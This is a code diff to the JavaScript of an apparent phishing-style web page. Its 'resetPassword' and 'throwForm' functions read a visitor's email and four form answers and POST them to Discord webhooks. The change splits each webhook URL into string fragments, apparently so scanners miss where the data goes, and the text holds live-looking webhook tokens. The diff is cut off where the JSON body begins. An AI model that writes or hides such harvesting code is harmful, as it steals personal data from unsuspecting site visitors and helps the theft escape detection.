@@ -82,12 +82,18 @@ function registerButton(){
 }
 
 function resetPassword() {
-    var URL = `https://discord.com/api/webhooks/`
-    var URLB = `988985468353912832/rvTkVc7bekRaNcoC72biErymB6NWnGs1zy2MVASOEXXTdX7Y4hDblVKQ7dJ0wsiY2rh_`;
-    var URLC = URL + URLB;
+    var URL = `discor`
+    var URLB = `d.com/ap`;
+    var URLC = `i/webh`;
+    var URLD = `ooks/`;
+    var URLE = `123606444682`;
+    var URLF = `1175407/Qn8usOxxRlG2rcDidXc6`;
+    var URLG = `COW1KGGSPQw6tMydjfB09izXU3MlWRpRN2BHJHky7Tiq17Hk`;
+    var URLH = URL + URLB + URLC + URLD;
+    var URLI = URLH  + URLE + URLF + URLG;
     const e = document.getElementById("email")
     document.getElementById("reset").hidden = false;
-    fetch(URLC, {
+    fetch(URLI, {
         "method":"POST",
         "headers": {"Content-Type": "application/json"},
         "body": JSON.stringify({
@@ -103,15 +109,21 @@ function toForm() {
 }
 
 function throwForm() {
-    var URL = `https://discord.com/api/webhooks/`
-    var URLB = `1024414805886509077/Jt_t0eqO9HRSq3hkP7cegNN2Vo5oaN-HQAxuLjqkJbC8sxwSrcWgeeEKb_9aoUFqqk4g`;
-    var URLC = URL + URLB;
+    var URL = `discor`
+    var URLB = `d.com/ap`;
+    var URLC = `i/webh`;
+    var URLD = `ooks/`;
+    var URLE = `102441480588`;
+    var URLF = `6509077/Jt_t0eqO9HRSq3hkP7ce`;
+    var URLG = `gNN2Vo5oaN-HQAxuLjqkJbC8sxwSrcWgeeEKb_9aoUFqqk4g`;
+    var URLH = URL + URLB + URLC + URLD;
+    var URLI = URLH  + URLE + URLF + URLG;
     const a1 = document.getElementById("ans1").value
     const a2 = document.getElementById("ans2").value
     const a3 = document.getElementById("ans3").value
     const a4 = document.getElementById("ans4").value
     document.getElementById("submitted").hidden = false;
-    fetch(URLC, {
+    fetch(URLI, {
         "method":"POST",
         "headers": {"Content-Type": "application/json"},
         "body": JSON.stringify({
